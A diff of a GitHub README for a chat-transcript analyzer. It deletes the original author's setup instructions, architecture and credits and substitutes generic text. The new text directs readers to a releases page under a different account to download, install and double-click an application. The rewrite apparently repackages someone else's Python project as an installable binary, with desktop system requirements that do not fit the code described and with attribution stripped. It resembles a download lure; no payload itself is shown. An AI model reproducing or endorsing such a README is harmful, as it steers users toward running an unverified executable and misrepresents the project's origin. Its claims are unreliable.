@@ -1,164 +1,84 @@
-# 🧠 Agentic AI Chat Analyzer
+# 💬 Agentic-AI-Chat-Analyzer - Analyze Conversations with Ease
 
-> An AI-powered platform for analyzing agent chat transcripts about Washington Post articles using lightweight LLMs, visual EDA, and an interactive frontend.  
-> Designed to summarize conversations, detect sentiments, and deliver insights — all through a modular, API-driven architecture.
+[![Download](https://img.shields.io/badge/Download-Release-007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer/releases)
 
----
+## 📖 Overview
 
-## 🚀✨ Features
-✅ Modular Data Pipeline – Clean ingestion, cleaning, and transformation
+Agentic-AI-Chat-Analyzer allows you to analyze conversations. It generates smart summaries, sentiment insights, and even article links. This tool uses modern technologies to make conversation analysis simple and accessible.
 
-📊 EDA + Profiling – Dataset summaries, word clouds, sentiment plots
+## 💡 Key Features
 
-🧠 LLM Summarizer – Uses Flan-T5-small
+- **Smart Summaries:** Quickly capture key points from conversations.
+- **Sentiment Analysis:** Understand the emotions behind the words.
+- **Article Links:** Access relevant articles directly from the analysis.
+- **User-Friendly Interface:** Designed for everyone, no programming knowledge is required.
+- **Powered by Modern Tech:** Utilizes FastAPI, Streamlit, and HuggingFace technologies.
 
-💬 Sentiment Classification – CardiffNLP RoBERTa Sentiment
+## 🚀 Getting Started
 
-🌐 FastAPI Backend – 3 REST endpoints with Pydantic validation
+Follow these simple steps to download and run Agentic-AI-Chat-Analyzer.
 
-🖼️ Streamlit Frontend – Interactive UI for real-time transcript analysis
+1. **Visit the Releases Page:**
+   Click the link below to access the release page where you can download the application.
 
-📦 Model Caching – Offline-ready with locally saved models
+   [Visit Releases Page](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer/releases)
 
-🧪 Evaluation Pipeline – Accuracy and BLEU score metrics
+2. **Download the Latest Version:**
+   On the releases page, find the latest version. Click on it to download the application file.
 
----
+3. **Install the Application:**
+   Open the downloaded file and follow any prompts to install. Installation is typically straightforward and shouldn’t take long.
 
-## 🗂️ Folder Structure
-```bash
-Agentic_AI_ChatAnalyzer/
-├── app/                # Core app logic (API, services, utils)
-├── data/               # Dataset and output CSVs
-├── models/             # Locally saved HuggingFace models
-├── notebooks/          # EDA and profiling notebook
-├── scripts/            # Model downloader and batch inference
-├── streamlit_app/      # UI client (integrated with FastAPI)
-├── main.py             # FastAPI entrypoint
-├── requirements.txt    # Python dependencies
-├── .gitignore
-└── README.md
-```
+4. **Run the Application:**
+   Once installed, locate the application on your computer. Double-click the icon to launch the Agentic-AI-Chat-Analyzer.
 
----
+5. **Start Analyzing Conversations:**
+   After opening, you can begin by uploading your conversation files. Follow the on-screen instructions to receive your analysis.
 
-## 📐 System Architecture
+## 🖥️ System Requirements
 
-```mermaid
-flowchart LR
-    A["User Input via Streamlit UI"] --> B["POST Transcript to FastAPI API"]
-    B --> C["LLM Summarizer (Flan-T5)"]
-    B --> D["Sentiment Classifier (RoBERTa)"]
-    C --> E["Summary Output"]
-    D --> F["Sentiment per Agent"]
-    E --> G["Response JSON to Streamlit"]
-    F --> G
-    G --> H["Visualization: WordClouds + Metrics"]
-```
+To ensure the best experience, your computer should meet the following requirements:
 
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a recent Linux distribution.
+- **Processor:** Minimum dual-core processor.
+- **RAM:** At least 4GB.
+- **Storage:** 200MB of free disk space.
 
----
+## 🔧 Usage Instructions
 
-## ⚙️ Setup Instructions
+1. **Prepare Your Data:**
+   Make sure your conversation files are in a supported format (e.g., .txt, .csv). Clean up any unnecessary data to focus on the conversation itself.
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/yashdew3/Agentic-AI-Chat-Analyzer.git
-cd Agentic_AI_ChatAnalyzer
+2. **Upload Conversations:**
+   Use the application's interface to upload your file. Select the file from your computer and confirm your choice.
 
-# 2. Create and activate environment (optional)
-python -m venv venv
-source venv/bin/activate   # Windows: venv\Scripts\activate
+3. **Get Results:**
+   Click on the "Analyze" button. The application will process your data and display the results, including summaries and sentiment insights.
 
-# 3. Install dependencies
-pip install -r requirements.txt
+4. **Review and Save:**
+   Take time to review the results. You can save the insights for future reference, either by exporting them or taking screenshots.
 
-# 4. Download local LLM + sentiment models (run once)
-python scripts/download_models.py
-```
----
+## 📜 Troubleshooting
 
-## 🚀 How to Use
-### Run FastAPI Backend
-```bash
-uvicorn main:app --reload
-```
-- Access Swagger Docs: http://localhost:8000/docs
+- **Installation Issues:** Ensure your operating system meets the requirements. Re-download the installer if the file doesn’t work.
+- **Application Crashes:** Try closing other programs to free up memory. If issues persist, consider reinstalling the application.
+- **File Upload Problems:** Check the format of your conversation files. Ensure they are not corrupted and are supported by the application.
 
----
-### Run Streamlit Frontend
-```bash
-streamlit run streamlit_app/app_ui.py
-```
-- Analyze transcripts visually
+## 🌐 Community and Support
 
-- Paste chats and see live: 
-    - `Summary`
-    - `Sentiment Insights`
-    - `Word Clouds`
-    - `Article Links`
----
+If you have questions, consider joining our discussion forum. You can find help from other users or get tips on using the application more effectively.
 
-## 📡 API Endpoints
+## 🔗 Additional Links
 
-| Method | Endpoint     | Description                                        |
-| ------ | ------------ | -------------------------------------------------- |
-| GET    | `/summary`   | Returns dataset stats                              |
-| POST   | `/transform` | Preprocess and clean new chat input                |
-| POST   | `/insights`  | Summarizes, classifies sentiment, returns insights |
+For more information, visit the following resources:
 
----
+- **Documentation:** Detailed instructions can be found in the application's documentation.
+- **GitHub Repository:** Explore the source code and latest updates [here](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer).
 
-## 🧪 Sample API Input
+## 📥 Download & Install
 
-### 📥 Sample Payload (for `/insights`)
-```json
-{
-  "content": [
-    {"agent": "agent_1", "message": "Let’s discuss the article on the new football rule change."},
-    {"agent": "agent_2", "message": "Yes, it's causing a lot of debate on ESPN."}
-  ],
-  "article_url": "https://www.washingtonpost.com/sports/football-rule-change"
-}
+To get started with analyzing conversations easily, visit the link below to download the latest version of Agentic-AI-Chat-Analyzer.
 
-```
----
+[Visit Releases Page](https://github.com/IvanBG001/Agentic-AI-Chat-Analyzer/releases)
 
-## 📈 Tech Stack
-
-| Layer       | Tools Used                                 |
-| ----------- | ------------------------------------------ |
-| Backend     | FastAPI, Uvicorn, Pydantic                 |
-| Frontend    | Streamlit, Matplotlib, WordCloud           |
-| NLP Models  | HuggingFace Transformers: Flan-T5, RoBERTa |
-| Analysis    | Pandas, Seaborn, ydata-profiling           |
-| LLM Hosting | Locally saved models in `/models/`         |
----
-
-## 🔮 Future Enhancements
-- 🔐 Add JWT authentication
-
-- 🐳 Dockerize backend & frontend for deployment
-
-- ☁️ Deploy on Render, Railway, or HuggingFace Spaces
-
-- 📤 Export chat reports (PDF/CSV)
-
-- 💬 Multi-transcript support with database
-
----
-
-## 📄 License
-MIT License © Yash Dewangan
-
-## ⭐ Show Your Support
-If you liked this project, give it a ⭐ star on GitHub and feel free to fork it!
-
-## 💬 Let's Connect
-Feel free to connect or suggest improvements!
-- Built by **Yash Dewangan**
-- 🐙Github: [YashDewangan](https://github.com/yashdew3)
-- 📧Email: [yashdew06@gmail.com](mailto:yashdew06@gmail.com)
-- 🔗Linkedin: [YashDewangan](https://www.linkedin.com/in/yash-dewangan/)
-
-## 🤝 Contributing
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/yashdew3/Agentic-AI-Chat-Analyzer/issues) (if you have one) or open a new issue to discuss changes. Pull requests are also appreciated.
+Enjoy your experience with Agentic-AI-Chat-Analyzer, and unlock the insights buried in your conversations!
